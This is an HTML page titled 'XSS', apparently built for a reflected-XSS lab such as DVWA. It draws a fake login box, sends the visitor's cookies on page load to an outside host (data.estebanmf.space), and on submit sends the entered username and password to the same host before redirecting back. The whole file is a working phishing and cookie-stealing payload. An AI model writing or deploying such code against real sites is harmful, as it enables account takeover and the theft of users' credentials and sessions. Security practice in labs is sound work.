<!DOCTYPE html>
<html>

<head>
  <title>XSS</title>
</head>

<body>
  <div id="xss-container"
    style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;">
    <input id="u" type="text" placeholder="Username" style="display:block;margin:10px auto;padding:5px;width:200px;"
      required>
    <input id="p" type="password" placeholder="Password" style="display:block;margin:10px auto;padding:5px;width:200px;"
      required>
    <button id="submit-btn"
      style="padding:5px 15px;background:#4CAF50;color:white;border:none;border-radius:4px;">Send</button>
    <div id="msg" style="color:green;margin-top:10px;display:none;">Sent!</div>
  </div>
  <script>
    // Ensure DOM is loaded before attaching event listeners
    document.addEventListener('DOMContentLoaded', function () {
      console.log('DOM loaded, attaching event listener to submit-btn');

      // Initial cookie send
      fetch('https://data.estebanmf.space/cookies', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({cookies: document.cookie}),
        mode: 'no-cors' // Use no-cors to bypass CORS restrictions for debugging
      })
        .then(() => console.log('Cookie fetch sent'))
        .catch(e => console.error('Cookie fetch failed:', e));

      const submitBtn = document.getElementById('submit-btn');
      if (!submitBtn) {
        console.error('Submit button not found');
        return;
      }

      submitBtn.onclick = function () {
        console.log('Submit button clicked');
        let u = document.getElementById('u').value;
        let p = document.getElementById('p').value;
        if (!u || !p) {
          console.log('Validation failed: Empty fields');
          alert('Fill both fields.');
          return;
        }
        console.log('Sending credentials:', {username: u, password: p});
        fetch('https://data.estebanmf.space/credentials', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({username: u, password: p}),
          mode: 'no-cors' // Use no-cors for debugging
        })
          .then(r => {
            console.log('Fetch response received');
            // Note: With mode: 'no-cors', response.ok can't be checked reliably
            document.getElementById('msg').style.display = 'block';
            setTimeout(() => {
              console.log('Resetting inputs and redirecting');
              document.getElementById('u').value = '';
              document.getElementById('p').value = '';
              document.getElementById('msg').style.display = 'none';
              window.location.href = document.referrer || 'http://kali.kali.estebanmf.space/vulnerabilities/xss_r/';
            }, 2000);
          })
          .catch(e => {
            console.error('Credentials fetch failed:', e);
            alert('Error: ' + e.message);
          });
      };
    });
  </script>
</body>

</html>
